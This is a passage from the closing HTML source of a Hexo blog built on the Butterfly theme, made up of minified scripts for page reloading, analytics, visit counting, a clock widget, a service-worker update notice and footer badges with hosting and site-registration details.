e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-214297516-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ h-t-m 更新了 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">👨‍💻立即刷新👌</span></a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"✨ h-t-m 更新了 👉",backgroundColor:t,duration:5e5,pos:e,actionText:"👨‍💻立即刷新👌",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script></div><script>var fdata={apiurl:"https://fcircle-h-t-m.vercel.app/api",initnumber:20,stepnumber:10,error_img:"https://cdn.jsdelivr.net/npm/akilar-candyassets/image/404.gif"};localStorage.setItem("fdatalist",JSON.stringify(fdata))</script><script defer src="https://cdn.jsdelivr.net/npm/hexo-filter-fcircle/assets/js/fetch.min.js"></script><script data-pjax>function butterfly_clock_injector_config(){var l=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock"),l.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/images/~logo.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_injector_config()</script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementById("footer-wrap");console.log("已挂载butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="https://pic.h-t-m.ltd/img/Frame-Hexo.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v3.8.2" title=""><img src="https://pic.h-t-m.ltd/img/Theme-Butterfly.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站默认线路托管于Vercel" title=""><img src="https://pic.h-t-m.ltd/img/Hosted-Vercel.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Gtihub托管" title=""><img src="https://pic.h-t-m.ltd/img/Source-Github.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" style="margin-inline:5px" data-title="本网站由又拍云提供 CDN 加速 / 云储存服务" title=""><img src="https://pic.h-t-m.ltd/img/upyun.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011502001415" style="margin-inline:5px" data-title="本站已完成公安备案，备案号鄂公网安备 42011502001415号" title=""><img src="https://pic.h-t-m.ltd/img/police-beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在工信部备案，备案号赣ICP备2021010131号-2" title=""><img src="https://pic.h-t-m.ltd/img/beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20220223" style="margin-inline:5px" data-title="本站已在萌国备案，备案号萌ICP备20220223号" title=""><img src="https://pic.h-t-m.ltd/img/moe-beian.svg" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/js/runtime.js"></script></body></html>